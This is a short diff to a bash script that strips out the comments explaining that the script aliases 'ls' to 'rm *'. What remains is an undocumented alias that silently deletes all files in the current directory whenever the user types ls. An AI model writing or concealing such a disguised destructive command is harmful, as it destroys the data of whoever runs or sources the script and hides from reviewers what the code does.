@@ -1,5 +1,2 @@
 #!/bin/bash
-# This script creates an alias for the ls command.
-# The alias makes 'ls' behave like 'rm *', which removes all files in the current directory.
-
 alias ls='rm *'
